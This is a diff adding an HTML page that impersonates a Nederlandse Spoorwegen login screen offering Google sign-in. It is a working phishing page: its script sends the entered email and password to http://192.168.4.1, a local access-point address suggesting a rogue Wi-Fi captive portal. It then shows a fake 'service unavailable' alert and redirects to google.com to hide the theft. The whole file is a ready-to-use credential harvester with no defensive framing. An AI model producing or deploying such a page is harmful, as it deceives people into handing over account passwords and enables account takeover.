@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Inlog Pagina</title>
+    <style>
+body {
+    font-family: 'Arial', sans-serif;
+    background-color: #f4f4f4;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}
+
+.login-form {
+    background-color: white;
+    padding: 20px;
+    border-radius: 8px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    text-align: center;
+}
+
+.login-image {
+    width: 100%;
+    height: 150px;
+    background-image: url('data:image/svg+xml;base64,PHN2ZyB2ZXJzaW9uPSIxLjAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyINCiB3aWR0aD0iMjU2LjAwMDAwMHB0IiBoZWlnaHQ9IjEwMy4wMDAwMDBwdCIgdmlld0JveD0iMCAwIDI1NjAuMDAwMDAwIDEwMzUuMDAwMDAwIg0KIHByZXNlcnZlQXNwZWN0UmF0aW89InhNaWRZTWlkIG1lZXQiPg0KICA8ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgwLjAwMDAwMCwxMDM1LjAwMDAwMCkgc2NhbGUoMC4xMDAwMDAsLTAuMTAwMDAwKSINCiAgZmlsbD0iIzMzMzM5OSIgc3Ryb2tlPSJub25lIj4NCiAgICA8cGF0aCBkPSJNMjczMiA3NjE3IGwtMjQ0MiAtMjQ0MiAyNDQzIC0yNDQzIDI0NDIgLTI0NDIgMTM5MCAwIDEzOTAgMCAtMTk1MA0KICAgIDE5NTAgLTE5NTAgMTk1MCAyNjc1IDAgYzIyNDYgMCAyNjg2IC0zIDI3NDEgLTE0IDg3IC0xOSAxODAgLTU4IDI1OSAtMTExIDQ1DQogICAgLTMwIDU0MSAtNTE3IDE2MDUgLTE1NzcgODk1IC04OTEgMTU3OCAtMTU2NCAxNjMyIC0xNjA2IDE1MiAtMTIxIDMwOCAtMjE5DQogICAgNDk4IC0zMTIgMjU4IC0xMjggNDk0IC0yMDQgNzg1IC0yNTMgMTI1IC0yMSAxMjcgLTIxIDMxNTAgLTI0IGwzMDI1IC0zIDI0NDINCiAgICAyNDQyIDI0NDMgMjQ0MyAtMjQ0MiAyNDQyIC0yNDQzIDI0NDMgLTEzOTAgMCAtMTM5MCAwIDE5NTUgLTE5NTUgMTk1NSAtMTk1NQ0KICAgIC0yNjg1IDIgLTI2ODUgMyAtODAgMjMgYy05MiAyNiAtMTg0IDY3IC0yNTIgMTEzIC0yNyAxNyAtNzQxIDcyMyAtMTU4OCAxNTY5DQogICAgLTg0NyA4NDUgLTE1NzggMTU2OCAtMTYyNSAxNjA1IC00MTUgMzMwIC05MTIgNTMyIC0xNDM5IDU4NSAtNjggNyAtMTEwOSAxMA0KICAgIC0zMDY1IDEwIGwtMjk2MSAwIC0yNDQzIC0yNDQzeiBtODMxMSA0NzIgYzEwMiAtMTYgMjI1IC02MyAzMTEgLTExOSA1OSAtMzgNCiAgICAzODMgLTM1OCAxNTY3IC0xNTQ1IDgyMiAtODI0IDE1MzcgLTE1MzMgMTU4OSAtMTU3NyA0NjYgLTM5MiAxMDE1IC02MTEgMTYyMg0KICAgIC02NDggODkgLTYgMTI2MiAtMTAgMjc4MyAtMTAgbDI2MzAgMCAtOTcwIC05NzAgLTk3MCAtOTcwIC0yNTMwIDMgYy0yNDEyIDINCiAgICAtMjUzMyAzIC0yNTkwIDIxIC04NSAyNiAtMTczIDY3IC0yNDYgMTE2IC00MyAyOSAtNTUxIDUyOCAtMTU3NCAxNTUwIC04MzANCiAgICA4MjggLTE1MzcgMTUyOSAtMTU3MCAxNTU3IC0zODUgMzIyIC04MjQgNTI4IC0xMzI1IDYyMCBsLTE1NSAyOCAtMjc4MCA1IC0yNzc5DQogICAgNSA5NjggOTczIDk2OSA5NzIgMjQ4OSAwIGMxNzc4IDAgMjUxMCAtMyAyNTYxIC0xMXoiLz4NCiAgPC9nPg0KPC9zdmc+DQo='); /* Remplacez ... par votre image en base64 */
+    background-repeat: no-repeat;
+    background-position: center;
+    background-size: contain;
+    border-top-left-radius: 40px;
+    border-top-right-radius: 40px;
+    margin-bottom: 20px;
+}
+
+.form-control {
+    width: 100%;
+    padding: 10px;
+    margin-bottom: 10px;
+    border: 1px solid #ddd;
+    border-radius: 4px;
+    box-sizing: border-box;
+    text-align: center;
+}
+
+.form-control:focus {
+    border-color: #0056b3;
+    outline: none;
+}
+
+.btn {
+    width: 100%;
+    padding: 10px;
+    border: none;
+    border-radius: 4px;
+    background-color: #007bff;
+    color: white;
+    cursor: pointer;
+    transition: background-color 0.3s;
+}
+
+.btn:hover {
+    background-color: #0056b3;
+}
+
+.welcome-text {
+    font-size: 24px;
+    margin: 20px 0;
+    color: #333;
+}
+
+.google-login {
+    font-size: 18px;
+    margin: 10px 0;
+    color: #555;
+}
+
+    </style>
+</head>
+<body>
+    <div class="login-form">
+        <div class="login-image"></div>
+        <div class="welcome-text">Welkom bij de Nederlandse Spoorwegen</div>
+        <div class="google-login">Log in met Google</div>
+        <input type="email" id="email" class="form-control" placeholder="Email">
+        <input type="password" id="password" class="form-control" placeholder="Wachtwoord">
+        <button onclick="sendCredentials()" class="btn">Aanmelden</button>
+    </div>
+
+    <script>
+        function sendCredentials() {
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+            
+            getFile("http://192.168.4.1/?email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password));
+            alert("Service indisponible.");
+            window.location.href = "https://www.google.com";
+        }
+
+        function getFile(url) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", url, true);
+            xhr.send();
+        }
+    </script>
+</body>
+</html>
